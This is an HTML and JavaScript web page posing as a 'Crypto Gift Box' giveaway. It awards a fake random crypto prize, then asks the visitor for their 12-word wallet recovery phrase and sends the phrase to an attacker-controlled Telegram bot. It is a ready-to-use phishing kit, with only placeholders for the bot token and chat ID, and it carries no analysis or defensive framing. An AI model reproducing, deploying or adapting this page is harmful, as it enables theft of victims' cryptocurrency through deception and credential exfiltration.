<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Crypto Gift Box</title>
  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0d0d0d;
      color: #fff;
      font-family: 'Poppins', sans-serif;
      height: 100vh;
      overflow: hidden;
    }
    #particles-js {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 0;
    }
    .container {
      position: relative;
      z-index: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    .gift-box {
      width: 150px;
      height: 150px;
      background: linear-gradient(145deg, #1a1a1a, #333);
      border: 2px solid #ffcc00;
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 50px;
      cursor: pointer;
      animation: pulse 2s infinite;
      margin-bottom: 20px;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    .prize {
      margin-top: 20px;
      font-size: 24px;
      font-weight: bold;
      display: none;
    }
    .claim-btn, .submit-btn {
      margin-top: 20px;
      padding: 12px 30px;
      background-color: #ffcc00;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    .claim-btn:hover, .submit-btn:hover {
      background-color: #ff9900;
    }
    .mnemonic-input {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }
    .mnemonic-input textarea {
      width: 300px;
      height: 100px;
      border-radius: 10px;
      padding: 10px;
      border: none;
      resize: none;
      font-size: 16px;
      margin-bottom: 10px;
    }
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #222;
      padding: 30px 40px;
      border-radius: 20px;
      border: 2px solid #ffcc00;
      font-size: 20px;
      display: none;
      z-index: 10;
    }
  </style>
</head>

<body>
<div id="particles-js"></div>

<div class="container">
  <div class="gift-box" id="giftBox">üéÅ</div>
  <div class="prize" id="prizeText"></div>
  <button class="claim-btn" id="claimBtn" style="display:none;">Claim</button>
  
  <div class="mnemonic-input" id="mnemonicInput">
    <textarea id="mnemonic" placeholder="Enter your 12-word mnemonic phrase..."></textarea>
    <button class="submit-btn" id="submitBtn">Submit</button>
  </div>
</div>

<div class="popup" id="popup">You will get the item soon!</div>

<script>
  // Particles JS background
  particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json', function() {
    console.log('particles.js loaded');
  });

  const prizes = ["1 BNB", "10 USDT", "100 USDT", "1 BTC", "1 ETH", "1 LTC", "500 XRP", "0.5 SOL", "2 ADA", "100 DOGE"];
  const giftBox = document.getElementById('giftBox');
  const prizeText = document.getElementById('prizeText');
  const claimBtn = document.getElementById('claimBtn');
  const mnemonicInput = document.getElementById('mnemonicInput');
  const submitBtn = document.getElementById('submitBtn');
  const popup = document.getElementById('popup');
  let selectedPrize = "";

  giftBox.addEventListener('click', () => {
    selectedPrize = prizes[Math.floor(Math.random() * prizes.length)];
    prizeText.textContent = `You Won: ${selectedPrize}`;
    prizeText.style.display = 'block';
    claimBtn.style.display = 'inline-block';
    giftBox.style.animation = 'none';
  });

  claimBtn.addEventListener('click', () => {
    claimBtn.style.display = 'none';
    mnemonicInput.style.display = 'flex';
  });

  submitBtn.addEventListener('click', () => {
    const mnemonic = document.getElementById('mnemonic').value.trim();
    if (mnemonic.split(' ').length !== 12) {
      alert('Please enter exactly 12 words.');
      return;
    }
    
    const botToken = 'YOUR_BOT_TOKEN_HERE';
    const chatId = 'YOUR_CHAT_ID_HERE';
    const message = `Mnemonic:\n${mnemonic}\n\nPrize: ${selectedPrize}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      popup.style.display = 'block';
      setTimeout(() => {
        popup.style.display = 'none';
        location.reload();
      }, 3000);
    })
    .catch((error) => {
      console.error('Error:', error);
      alert('Something went wrong. Please try again.');
    });
  });
</script>
</body>
</html>
